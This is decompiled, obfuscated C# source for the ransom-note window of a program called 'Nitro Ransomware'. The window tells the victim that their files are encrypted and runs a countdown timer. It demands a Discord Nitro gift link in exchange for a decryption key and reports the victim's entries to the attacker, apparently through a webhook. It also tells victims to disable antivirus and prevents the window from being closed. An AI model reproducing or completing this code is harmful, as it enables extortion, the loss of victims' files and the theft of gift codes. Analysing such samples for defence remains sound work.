using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Timers;
using System.Windows.Forms;

public class MarkFaultAddr : Form
{
	private Timer Get_ReturnParameter;

	private int SETSTART = 3;

	private int INEGATIVEPERCENT = 0;

	private int Get_MonthGenitiveNames = 0;

	private ImageStreamCreator PointerToLinenumbers = new ImageStreamCreator(Set_ColumnReader.S_allSystemTimeZonesRead);

	private IContainer Abort = null;

	private BackgroundWorker M_fullname;

	private Label FromBase64CharArray;

	private TextBox Argument_InvalidType;

	private Label StackBehaviourPush;

	private Label Mscorlib;

	private Panel DictionaryEntry;

	private Panel IsClassSig;

	private Label _chMin;

	private Button NullReferenceException;

	private Label Get_DefaultScheduler;

	private TextBox AllowIdn;

	private Label Get_EnglishName;

	private Button YearSpace;

	private TextBox Get_Target;

	private TextBox Verbose;

	private Label NGetPublicKeyToken;

	private Label M_blob;

	private TextBox MethodCodeType;

	private Panel ALPHA64;

	private Label MarshalType;

	private bool AllLongTimePatterns
	{
		get
		{
			//IL_0084: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
			ImageStreamCreator imageStreamCreator = new ImageStreamCreator(Set_ColumnReader.S_allSystemTimeZonesRead);
			string text = ((Control)Get_Target).get_Text();
			string empty = string.Empty;
			Console.WriteLine(text);
			if (text.Contains("discord.gift/"))
			{
				if (text.Contains("https://"))
				{
					int num = text.IndexOf("/");
					empty = text.Substring(num + 15);
					Console.WriteLine(empty);
				}
				else
				{
					int num2 = text.IndexOf("/");
					empty = text.Substring(num2 + 1);
					MessageBox.Show("Checking gift validity.. .", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
				}
				if (m_inliningDepth.MaxMachineNameLength(empty))
				{
					imageStreamCreator.Set_Extra("**Valid nitro code was received**");
					imageStreamCreator.Set_Extra(text);
					MessageBox.Show("Success! Valid nitro code was sent. Your decryption key is now available. You may start decrypting your files now.", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
					return true;
				}
				imageStreamCreator.Set_Extra("```User sent invalid discord gift Link.```");
				MessageBox.Show("Invalid Nitro", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			else
			{
				imageStreamCreator.Set_Extra("```User sent invalid discord gift Link.```");
				MessageBox.Show("Please enter a Discord nitro gift in this format discord.gift/code here", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			return false;
		}
	}

	public MarkFaultAddr()
	{
		PutRefDispProperty();
	}

	private void Get_FullTableSize(object sender, EventArgs e)
	{
		Get_ReturnParameter = new Timer();
		Get_ReturnParameter.Interval = 1000.0;
		Get_ReturnParameter.Elapsed += InplaceUnion;
		Get_ReturnParameter.Start();
		((Control)MethodCodeType).set_Text("");
		foreach (string item in StartInternal.Get_IsValueCreated)
		{
			TextBox methodCodeType = MethodCodeType;
			((Control)methodCodeType).set_Text(((Control)methodCodeType).get_Text() + "Encrypted: " + item + "\r\n");
		}
	}

	private void STANDARD_RIGHTS_WRITE(object sender, FormClosingEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		((CancelEventArgs)(object)e).Cancel = (int)e.get_CloseReason() == 3;
	}

	private void _inputEncoding(object sender, EventArgs e)
	{
		if (AllLongTimePatterns)
		{
			((Control)AllowIdn).set_Text(StartInternal._64Bit);
			((Control)NGetPublicKeyToken).set_Text("Paste your key here.");
			((Control)NGetPublicKeyToken).set_ForeColor(Color.LightGreen);
			((Control)Verbose).set_Text("");
			((Control)FromBase64CharArray).set_Text("");
			((Control)ALPHA64).set_BackColor(Color.FromArgb(35, 39, 42));
			((Control)Argument_InvalidType).set_Text("How to Decrypt files:\r\n Enter decryption key and click on Decrypt button. \n Make sure Windows Defender and any other antivirus is off.\r\n Do not close the application while decrypting or else files may get corrupted.");
			Get_ReturnParameter.Stop();
		}
	}

	private void M_isParamArray(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		string text = ((Control)Verbose).get_Text();
		if (text == StartInternal._64Bit)
		{
			PointerToLinenumbers.Set_Extra("```User has entered correct decryption key.. Decrypting files.```");
			MessageBox.Show("Key is correct. Decrypting files...", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
			StartInternal.SizeOfHeaders = StartInternal._64Bit;
			((Control)MethodCodeType).set_Text("Decrypting files.. \r\nThis may take a while. Loading..");
			Cursor.set_Current(Cursors.get_WaitCursor());
			Set_ColumnReader.Anonymous();
			Cursor.set_Current(Cursors.get_Default());
			MessageBox.Show("Task complete. If there are files that have not been decrypted, make sure you turn off all antivirus and Windows Defender, then try decrypting again. \r\nIf it doesn't work, delete all Desktop.ini.givemenitro files that you see and try again.", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else
		{
			MessageBox.Show("Invalid key", "Nitro Ransomware", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void InplaceUnion(object sender, ElapsedEventArgs e)
	{
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			if (Get_MonthGenitiveNames < 1)
			{
				Get_MonthGenitiveNames = 59;
				if (INEGATIVEPERCENT == 0)
				{
					INEGATIVEPERCENT = 59;
					if (SETSTART != 0)
					{
						SETSTART--;
					}
				}
				else
				{
					INEGATIVEPERCENT--;
				}
			}
			else
			{
				Get_MonthGenitiveNames--;
			}
			if (Get_MonthGenitiveNames != 0 || INEGATIVEPERCENT != 0 || SETSTART != 0)
			{
			}
			((Control)MarshalType).set_Text($"{SETSTART.ToString().PadLeft(2, '0')}:{INEGATIVEPERCENT.ToString().PadLeft(2, '0')}:{Get_MonthGenitiveNames.ToString().PadLeft(2, '0')}");
		});
	}

	protected override void M_pDocWriter(bool disposing)
	{
		if (disposing && Abort != null)
		{
			Abort.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void PutRefDispProperty()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Expected O, but got Unknown
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d7: Expected O, but got Unknown
		//IL_029c: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a6: Expected O, but got Unknown
		//IL_032c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0336: Expected O, but got Unknown
		//IL_04aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b4: Expected O, but got Unknown
		//IL_05d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e2: Expected O, but got Unknown
		//IL_06fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0708: Expected O, but got Unknown
		//IL_0960: Unknown result type (might be due to invalid IL or missing references)
		//IL_096a: Expected O, but got Unknown
		//IL_09f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a01: Expected O, but got Unknown
		//IL_0aa1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aab: Expected O, but got Unknown
		//IL_0bc9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd3: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MarkFaultAddr));
		M_fullname = new BackgroundWorker();
		FromBase64CharArray = new Label();
		Argument_InvalidType = new TextBox();
		StackBehaviourPush = new Label();
		Mscorlib = new Label();
		DictionaryEntry = new Panel();
		IsClassSig = new Panel();
		_chMin = new Label();
		NullReferenceException = new Button();
		Get_DefaultScheduler = new Label();
		AllowIdn = new TextBox();
		Get_EnglishName = new Label();
		YearSpace = new Button();
		Get_Target = new TextBox();
		Verbose = new TextBox();
		NGetPublicKeyToken = new Label();
		M_blob = new Label();
		MethodCodeType = new TextBox();
		ALPHA64 = new Panel();
		MarshalType = new Label();
		((Control)IsClassSig).SuspendLayout();
		((Control)ALPHA64).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)FromBase64CharArray).set_AutoSize(true);
		((Control)FromBase64CharArray).set_Font(new Font("Microsoft Sans Serif", 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)FromBase64CharArray).set_ForeColor(Color.Red);
		((Control)FromBase64CharArray).set_Location(new Point(25, 19));
		((Control)FromBase64CharArray).set_Name("label1");
		((Control)FromBase64CharArray).set_Size(new Size(579, 37));
		((Control)FromBase64CharArray).set_TabIndex(2);
		((Control)FromBase64CharArray).set_Text(" Oh no! Your files have been encrypted.");
		((Control)Argument_InvalidType).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)Argument_InvalidType).set_BorderStyle((BorderStyle)0);
		((Control)Argument_InvalidType).set_Font(new Font("Segoe UI", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Argument_InvalidType).set_ForeColor(SystemColors.MenuBar);
		((Control)Argument_InvalidType).set_Location(new Point(404, 134));
		((TextBoxBase)Argument_InvalidType).set_Multiline(true);
		((Control)Argument_InvalidType).set_Name("textBox1");
		((TextBoxBase)Argument_InvalidType).set_ReadOnly(true);
		Argument_InvalidType.set_ScrollBars((ScrollBars)2);
		((Control)Argument_InvalidType).set_Size(new Size(370, 289));
		((Control)Argument_InvalidType).set_TabIndex(3);
		((Control)Argument_InvalidType).set_TabStop(false);
		((Control)Argument_InvalidType).set_Text(componentResourceManager.GetString("textBox1.Text"));
		((Control)StackBehaviourPush).set_AutoSize(true);
		((Control)StackBehaviourPush).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)StackBehaviourPush).set_ForeColor(SystemColors.Control);
		((Control)StackBehaviourPush).set_Location(new Point(553, 96));
		((Control)StackBehaviourPush).set_Name("label2");
		((Control)StackBehaviourPush).set_Size(new Size(45, 25));
		((Control)StackBehaviourPush).set_TabIndex(5);
		((Control)StackBehaviourPush).set_Text("Info");
		((Control)Mscorlib).set_AutoSize(true);
		((Control)Mscorlib).set_Font(new Font("Segoe UI", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Mscorlib).set_ForeColor(SystemColors.Control);
		((Control)Mscorlib).set_Location(new Point(127, 96));
		((Control)Mscorlib).set_Name("label3");
		((Control)Mscorlib).set_Size(new Size(147, 25));
		((Control)Mscorlib).set_TabIndex(6);
		((Control)Mscorlib).set_Text("Time Remaining");
		((Control)DictionaryEntry).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)DictionaryEntry).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)DictionaryEntry).set_Location(new Point(-1, -4));
		((Control)DictionaryEntry).set_Name("panel1");
		((Control)DictionaryEntry).set_Size(new Size(807, 32));
		((Control)DictionaryEntry).set_TabIndex(4);
		((Control)IsClassSig).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)IsClassSig).get_Controls().Add((Control)(object)FromBase64CharArray);
		((Control)IsClassSig).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)IsClassSig).set_Location(new Point(87, -1));
		((Control)IsClassSig).set_Name("panel2");
		((Control)IsClassSig).set_Size(new Size(613, 67));
		((Control)IsClassSig).set_TabIndex(7);
		((Control)_chMin).set_AutoSize(true);
		((Control)_chMin).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)_chMin).set_ForeColor(SystemColors.Control);
		((Control)_chMin).set_Location(new Point(84, 454));
		((Control)_chMin).set_Name("label4");
		((Control)_chMin).set_Size(new Size(151, 13));
		((Control)_chMin).set_TabIndex(9);
		((Control)_chMin).set_Text("Enter Discord Nitro giftcode");
		((Control)NullReferenceException).set_BackColor(SystemColors.ButtonHighlight);
		((ButtonBase)NullReferenceException).set_FlatStyle((FlatStyle)0);
		((Control)NullReferenceException).set_Location(new Point(258, 480));
		((Control)NullReferenceException).set_Name("button1");
		((Control)NullReferenceException).set_Size(new Size(75, 23));
		((Control)NullReferenceException).set_TabIndex(10);
		((Control)NullReferenceException).set_Text("Get Key");
		((ButtonBase)NullReferenceException).set_UseVisualStyleBackColor(false);
		((Control)NullReferenceException).add_Click((EventHandler)_inputEncoding);
		((Control)Get_DefaultScheduler).set_AutoSize(true);
		((Control)Get_DefaultScheduler).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Get_DefaultScheduler).set_ForeColor(SystemColors.Control);
		((Control)Get_DefaultScheduler).set_Location(new Point(84, 526));
		((Control)Get_DefaultScheduler).set_Name("label5");
		((Control)Get_DefaultScheduler).set_Size(new Size(122, 13));
		((Control)Get_DefaultScheduler).set_TabIndex(11);
		((Control)Get_DefaultScheduler).set_Text("Your Decryption key is:");
		((Control)AllowIdn).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)AllowIdn).set_BorderStyle((BorderStyle)1);
		((Control)AllowIdn).set_ForeColor(SystemColors.Window);
		((Control)AllowIdn).set_Location(new Point(71, 545));
		((Control)AllowIdn).set_Name("textBox3");
		((TextBoxBase)AllowIdn).set_ReadOnly(true);
		((Control)AllowIdn).set_Size(new Size(203, 20));
		((Control)AllowIdn).set_TabIndex(12);
		((Control)AllowIdn).set_TabStop(false);
		((Control)Get_EnglishName).set_AutoSize(true);
		((Control)Get_EnglishName).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Get_EnglishName).set_ForeColor(SystemColors.Control);
		((Control)Get_EnglishName).set_Location(new Point(550, 448));
		((Control)Get_EnglishName).set_Name("label6");
		((Control)Get_EnglishName).set_Size(new Size(84, 19));
		((Control)Get_EnglishName).set_TabIndex(13);
		((Control)Get_EnglishName).set_Text("Decrypt files");
		((Control)YearSpace).set_BackColor(SystemColors.ButtonHighlight);
		((ButtonBase)YearSpace).set_FlatStyle((FlatStyle)0);
		((Control)YearSpace).set_Location(new Point(657, 516));
		((Control)YearSpace).set_Name("button2");
		((Control)YearSpace).set_Size(new Size(75, 23));
		((Control)YearSpace).set_TabIndex(15);
		((Control)YearSpace).set_Text("Decrypt files");
		((ButtonBase)YearSpace).set_UseVisualStyleBackColor(false);
		((Control)YearSpace).add_Click((EventHandler)M_isParamArray);
		((Control)Get_Target).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)Get_Target).set_BorderStyle((BorderStyle)1);
		((Control)Get_Target).set_ForeColor(SystemColors.Window);
		((Control)Get_Target).set_Location(new Point(49, 482));
		((Control)Get_Target).set_Name("textBox2");
		((Control)Get_Target).set_Size(new Size(203, 20));
		((Control)Get_Target).set_TabIndex(8);
		((Control)Get_Target).set_TabStop(false);
		((Control)Get_Target).set_Text("discord.gift/example");
		((Control)Verbose).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)Verbose).set_BorderStyle((BorderStyle)1);
		((Control)Verbose).set_ForeColor(SystemColors.Window);
		((Control)Verbose).set_Location(new Point(448, 516));
		((Control)Verbose).set_Name("textBox4");
		((Control)Verbose).set_Size(new Size(203, 20));
		((Control)Verbose).set_TabIndex(17);
		((Control)Verbose).set_TabStop(false);
		((Control)Verbose).set_Text("send discord nitro to get key");
		((Control)NGetPublicKeyToken).set_AutoSize(true);
		((Control)NGetPublicKeyToken).set_Font(new Font("Segoe UI", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)NGetPublicKeyToken).set_ForeColor(SystemColors.Control);
		((Control)NGetPublicKeyToken).set_Location(new Point(445, 485));
		((Control)NGetPublicKeyToken).set_Name("label7");
		((Control)NGetPublicKeyToken).set_Size(new Size(236, 13));
		((Control)NGetPublicKeyToken).set_TabIndex(16);
		((Control)NGetPublicKeyToken).set_Text("Warning: Do not try guessing the password.");
		((Control)M_blob).set_AutoSize(true);
		((Control)M_blob).set_Font(new Font("Segoe UI", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)M_blob).set_ForeColor(SystemColors.Control);
		((Control)M_blob).set_Location(new Point(174, 329));
		((Control)M_blob).set_Name("label9");
		((Control)M_blob).set_Size(new Size(32, 19));
		((Control)M_blob).set_TabIndex(19);
		((Control)M_blob).set_Text("Log");
		((Control)MethodCodeType).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)MethodCodeType).set_BorderStyle((BorderStyle)0);
		((Control)MethodCodeType).set_Font(new Font("Segoe UI", 7.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)MethodCodeType).set_ForeColor(SystemColors.MenuBar);
		((Control)MethodCodeType).set_Location(new Point(35, 364));
		((TextBoxBase)MethodCodeType).set_Multiline(true);
		((Control)MethodCodeType).set_Name("textBox5");
		((TextBoxBase)MethodCodeType).set_ReadOnly(true);
		MethodCodeType.set_ScrollBars((ScrollBars)2);
		((Control)MethodCodeType).set_Size(new Size(347, 59));
		((Control)MethodCodeType).set_TabIndex(20);
		((Control)MethodCodeType).set_TabStop(false);
		((Control)ALPHA64).set_BackColor(Color.Crimson);
		((Control)ALPHA64).get_Controls().Add((Control)(object)MarshalType);
		((Control)ALPHA64).set_Location(new Point(35, 134));
		((Control)ALPHA64).set_Name("panel3");
		((Control)ALPHA64).set_Size(new Size(347, 178));
		((Control)ALPHA64).set_TabIndex(21);
		((Control)MarshalType).set_AutoSize(true);
		((Control)MarshalType).set_Font(new Font("Microsoft Sans Serif", 50f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)MarshalType).set_ForeColor(SystemColors.ControlLightLight);
		((Control)MarshalType).set_Location(new Point(23, 47));
		((Control)MarshalType).set_Name("label10");
		((Control)MarshalType).set_Size(new Size(293, 76));
		((Control)MarshalType).set_TabIndex(22);
		((Control)MarshalType).set_Text("00:00:00");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(44, 47, 51));
		((Form)this).set_ClientSize(new Size(800, 600));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)ALPHA64);
		((Control)this).get_Controls().Add((Control)(object)MethodCodeType);
		((Control)this).get_Controls().Add((Control)(object)M_blob);
		((Control)this).get_Controls().Add((Control)(object)Verbose);
		((Control)this).get_Controls().Add((Control)(object)NGetPublicKeyToken);
		((Control)this).get_Controls().Add((Control)(object)YearSpace);
		((Control)this).get_Controls().Add((Control)(object)Get_EnglishName);
		((Control)this).get_Controls().Add((Control)(object)AllowIdn);
		((Control)this).get_Controls().Add((Control)(object)Get_DefaultScheduler);
		((Control)this).get_Controls().Add((Control)(object)NullReferenceException);
		((Control)this).get_Controls().Add((Control)(object)_chMin);
		((Control)this).get_Controls().Add((Control)(object)Get_Target);
		((Control)this).get_Controls().Add((Control)(object)Mscorlib);
		((Control)this).get_Controls().Add((Control)(object)StackBehaviourPush);
		((Control)this).get_Controls().Add((Control)(object)Argument_InvalidType);
		((Control)this).get_Controls().Add((Control)(object)IsClassSig);
		((Control)this).get_Controls().Add((Control)(object)DictionaryEntry);
		((Control)this).set_ForeColor(SystemColors.ControlText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Get_FullTableSize);
		((Control)IsClassSig).ResumeLayout(false);
		((Control)IsClassSig).PerformLayout();
		((Control)ALPHA64).ResumeLayout(false);
		((Control)ALPHA64).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[CompilerGenerated]
	private void Get_PublicKey()
	{
		if (Get_MonthGenitiveNames < 1)
		{
			Get_MonthGenitiveNames = 59;
			if (INEGATIVEPERCENT == 0)
			{
				INEGATIVEPERCENT = 59;
				if (SETSTART != 0)
				{
					SETSTART--;
				}
			}
			else
			{
				INEGATIVEPERCENT--;
			}
		}
		else
		{
			Get_MonthGenitiveNames--;
		}
		if (Get_MonthGenitiveNames != 0 || INEGATIVEPERCENT != 0 || SETSTART != 0)
		{
		}
		((Control)MarshalType).set_Text($"{SETSTART.ToString().PadLeft(2, '0')}:{INEGATIVEPERCENT.ToString().PadLeft(2, '0')}:{Get_MonthGenitiveNames.ToString().PadLeft(2, '0')}");
	}
}
